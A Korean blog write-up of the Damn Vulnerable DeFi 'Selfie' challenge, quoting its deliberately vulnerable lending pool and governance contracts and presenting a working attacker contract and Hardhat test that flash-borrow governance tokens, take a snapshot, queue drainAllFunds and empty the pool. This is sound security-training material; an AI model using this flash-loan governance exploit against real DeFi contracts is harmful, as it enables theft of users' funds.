https://teberr.notion.site/Damn-Vunlerable-Defi-Selfie-3adc267353fc46eeb363be8a48255d20

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/810f4f8e-6bd0-44ca-a2d4-7437cef8a3de/%EB%AC%B8%EC%A0%9C.png)

문제 #6 - The rewarder

DVT 토큰 대출 서비스를 제공하는 새로운 대출 풀이 런칭되었습니다. 그리고 여기에는 이 대출 풀을 컨트롤 하기 위한 거버넌스 메커니즘이 같이 있습니다. 공격자는 DVT 토큰이 없고 대출 풀에는 150만개의 DVT 토큰이 있습니다. 대출 풀에 있는 150만개의 DVT 토큰을 탈취하는 것이 목적입니다.

# 코드 분석 및 공격 설계

SelfiePool과 SimpleGovernance 두개의 컨트랙트를 살펴보자.

## SelfiePool.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}
```

이 SelfiePool에서 생성자를 살펴보면 token은 ERC20Snapshot 토큰이고 governance는 SimpleGovernance 컨트랙트의 주소다.

SelfiePool은 flashLoan과 drainAllFunds 두개의 함수가 존재한다.

```solidity
    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

flashLoan함수는 다음과 같이 진행된다.

1. 이 컨트랙트 내에 있는 token(ERC20Snapshot)의 양이 빌려줄 양 보다 많아야 한다. 
2. token을 msg.sender에게 borrowamount 만큼 빌려준다.
3. msg.sender가 컨트랙트여야 한다.
4. msg.sender의 receiveTokens(address,uint256)을 address(token)과 borrowAmount만큼 보내준다.
5. 이 컨트랙트의 토큰 개수를 확인한다.
6. 빌려주기 전보다 빌려준 후가 더 많거나 같아야 한다.

```solidity
    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
```

drainAllFunds함수는 Governance 컨트랙트에서만 호출이 가능하며 다음과 같이 진행된다.

1. 이 컨트랙트의 토큰을 receiver에게 전부 전송한다.

이를 이용하면 토큰을 전부 꺼내올 수 있을 것 같다.

## SimpleGovernance.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SimpleGovernance {

    using Address for address;
    
    struct GovernanceAction {
        address receiver;
        bytes data;
        uint256 weiAmount;
        uint256 proposedAt;
        uint256 executedAt;
    }
    
    DamnValuableTokenSnapshot public governanceToken;

    mapping(uint256 => GovernanceAction) public actions;
    uint256 private actionCounter;
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    constructor(address governanceTokenAddress) {
        require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        actionCounter = 1;
    }
    
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
        require(receiver != address(this), "Cannot queue actions that affect Governance");

        uint256 actionId = actionCounter;

        GovernanceAction storage actionToQueue = actions[actionId];
        actionToQueue.receiver = receiver;
        actionToQueue.weiAmount = weiAmount;
        actionToQueue.data = data;
        actionToQueue.proposedAt = block.timestamp;

        actionCounter++;

        emit ActionQueued(actionId, msg.sender);
        return actionId;
    }

    function executeAction(uint256 actionId) external payable {
        require(_canBeExecuted(actionId), "Cannot execute this action");
        
        GovernanceAction storage actionToExecute = actions[actionId];
        actionToExecute.executedAt = block.timestamp;

        actionToExecute.receiver.functionCallWithValue(
            actionToExecute.data,
            actionToExecute.weiAmount
        );

        emit ActionExecuted(actionId, msg.sender);
    }

    function getActionDelay() public view returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = actions[actionId];
        return (
            actionToExecute.executedAt == 0 &&
            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
        );
    }
    
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
```

SimpleGovernance 함수는 GovernanceAction 구조체를 갖고 있고 ACTION_DELAY_SECONDS는 2일로 고정되어있다.

constructor, queueAction 함수, executeAction함수, getActionDelay함수, getActionDelay 함수, _canBeExecuted 함수, _hasEnoughVotes 함수가 있다.

이 중 _canBeExecuted 와 _hasEnoughVotes 함수는 다른 함수의 조건을 의미하므로 constructor와 같이 먼저 살펴보자.

```solidity
    constructor(address governanceTokenAddress) {
        require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        actionCounter = 1;
    }
```

constructor는 governanceTokenAddress를 받아 governanceToken에 저장한다. 이는 DamnValuableToken이다. 그리고 actionCounter를 1로 지정한다.

```solidity
     /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
	function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = actions[actionId];
        return (
            actionToExecute.executedAt == 0 &&
            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
        );
    }
```

_canBeExecuted 함수는 actionId를 받아 이에 해당하는 GovernanceAction 구조체를 읽어와 executedAt이 0이고 블록시간- 제안시점이 2일보다 커야한다. (실행한 적이 없고, 제안한 후 2일이 지나야 한다는 의미)

```solidity
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
```

_hasEnoughVotes 함수는 전달 받은 계정의 마지막 스냅샷 당시 거버넌스 토큰이 마지막 스냅샷 당시 총 거버넌스 토큰의 절반 보다 커야한다. (즉 account의 스냅샷 시점 거버넌스 토큰이 전체의 50%이상이어야함)

```solidity
    function getActionDelay() public view returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }
```

getActionDelay 함수는 2일을 리턴한다.

```solidity
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
        require(receiver != address(this), "Cannot queue actions that affect Governance");

        uint256 actionId = actionCounter;

        GovernanceAction storage actionToQueue = actions[actionId];
        actionToQueue.receiver = receiver;
        actionToQueue.weiAmount = weiAmount;
        actionToQueue.data = data;
        actionToQueue.proposedAt = block.timestamp;

        actionCounter++;

        emit ActionQueued(actionId, msg.sender);
        return actionId;
    }
```

queueAction 함수는 msg.sender가 절반이상의 거버넌스 토큰을 가지고 있고 receiver가 Governance 컨트랙트 자신 스스로가 아니어야 하는 조건이 있다.

1. actionID에 actionCounter를 넣는다.
2. GovernanceAction 구조체를 스토리지(블록)에 올려 저장할 actionToQueue에 actionId 공간을 할당해준다.
3. receiver, wieAmount, data, block.timestamp(제안한 시점)를 저장하고 actionCounter를 1증가시킨다.

즉 거버넌스 토큰을 절반이상 가진자가 다음에 실행될 action을 추가하는 과정이다.  

```solidity
    function executeAction(uint256 actionId) external payable {
        require(_canBeExecuted(actionId), "Cannot execute this action");
        
        GovernanceAction storage actionToExecute = actions[actionId];
        actionToExecute.executedAt = block.timestamp;

        actionToExecute.receiver.functionCallWithValue(
            actionToExecute.data,
            actionToExecute.weiAmount
        );

        emit ActionExecuted(actionId, msg.sender);
    }
```

executeAction함수는 actionId번째의 action이 제안한 시점으로부터 2일이 지났는지 체크한다.

실행시점을 현재 블록의timestamp로 설정하고 functionCallWithValue를 통해 data를 호출하는데 naive-receiver에서 보았던 functionCallWithValue를 보면

```
borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
```

실행시킬 함수가 있는 컨트랙트.(functionCallWithValue(함수를 바이트로 바꾼것),함수의인자)형태임을 확인할 수 있다.

즉 receiver 주소의 data(함수)를 weiAmount만큼 인자를 주어 실행한다. 

정리하면

1. Selfiepool의 flashLoan은 ERC20Snapshot 타입의 token을 대출해준다. (DamnValuableSnapshotToken은 ERC20Snapshot을 상속받으므로 거버넌스 토큰을 대출해준다고 생각하면 될 듯)
2. SelfiePool의 drainAllfunds는 거버넌스만 실행시킬 수 있으며 receiver에게 모든 자산을 전달한다. 즉 receiver가 attacker의 주소라면 attacker에게 전부 보내게 된다.
3. 거버넌스에서 내가 원하는 함수를 실행시키기 위해서는 거버넌스 토큰을 절반이상 가지고 receiver를 Selfipool 로 한 후 data를 이용해 SelfiePool의 drainAllfunds(attacker.address)를 실행시키면 된다.

Selfiepool에서 대출을 받기 위해서는 컨트랙트여야 하므로 컨트랙트를 생성하여 공격하자.

# 공격

attacker-contracts 폴더에 attackSelfie 컨트랙트를 생성하였다.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";

interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable ;
}

interface ISelfiePool{
    function flashLoan(uint256 borrowAmount) external ;
    function drainAllFunds(address receiver) external;
}

contract attackSelfie{

    DamnValuableTokenSnapshot governance_token;
    ISimpleGovernance SimpleGovernance;
    ISelfiePool pool;
    address attacker;
    uint256 actionId;
    constructor(address _SimpleGovernance,address _pool){
        SimpleGovernance = ISimpleGovernance(_SimpleGovernance);
        pool=ISelfiePool(_pool);
        attacker=msg.sender;
    }
    function loan(uint256 amount)public{
        pool.flashLoan(amount);
    }
    function receiveTokens(address _addr,uint256 amount) external {
        governance_token=DamnValuableTokenSnapshot(_addr);
        governance_token.snapshot();
        actionId=SimpleGovernance.queueAction(address(pool),abi.encodeWithSignature("drainAllFunds(address)",attacker),0);
        governance_token.transfer(msg.sender,amount);
    }

    function attack()public{
        SimpleGovernance.executeAction(actionId);
    }

}
```

loan은 대출 풀에서 대출을 받는 함수로 이 때 amount는 대출 풀에 있는 최대한의 토큰을 가져올 것이다.

receiveTokens는 대출을 받으면 실행되는 함수로 

1. 받은 토큰의 주소를 DamnValuableTokenSnapshot으로 감싸서(ERC20Snapshot을 상속받으므로 감쌀 수 있음) 
2. 스냅샷을 찍어주고 ( 그래야 내 컨트랙트 지갑주소가 가지고 있을 때 찍히므로) 
3. queueAction으로 pool의 drainAllfunds를 attacker의 주소를 인자로 해서 거버넌스에 저장해둔다. 그리고 리턴값인 actionId는 나중에 공격할 때 쓰므로 저장해둔다.
4. 그리고 나서 대출받은 토큰들을 다시 갚는다.

attack 함수는 거버넌스에 담아뒀던 Action을 리턴받았던 actionId를 통해서 실행시킨다. 

이제 test 폴더의 selfie.challange.js 에서 테스트를 통해 공격을 실행하자.

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
```

TOKENS_IN_POOL이 대출 풀에 있는 토큰 양이므로 이를 이용하자. 

```tsx
it('Exploit', async function () {
        const SelfieAttackFactory = await ethers.getContractFactory("attackSelfie",attacker);
        this.attack = await SelfieAttackFactory.deploy(this.governance.address,this.pool.address);
        await this.attack.connect(attacker).loan(TOKENS_IN_POOL);
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await this.attack.connect(attacker).attack();
    });
```

SelfieAttack을 deploy해준 후 다음과 같이 진행한다.

1. 대출 풀에서 최대한 대출을 받는다. 그러면 attackSelfie의 receiveToken이 실행되며 스냅샷 후 queueAction을 실행시키게 된다.
2. 2일이 지난 후에야 Action을 실행시킬 수 있으므로 2일을 진행시킨다.
3. attackSelfie 컨트랙트의 attack을 통해  executeAction을 실행시켜 drainAllfunds(attacker.address)를 실행시켜 전부 attacker에게 자산을 보내게 된다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/93c3afd6-07e1-40ea-8fdb-0bb2f2a6263d/%EC%84%B1%EA%B3%B5.png)

그리고 npm run selfie를 통해 테스트를 실행해보면 Exploit이 정상적으로 잘 진행된 것을 확인할 수 있다.
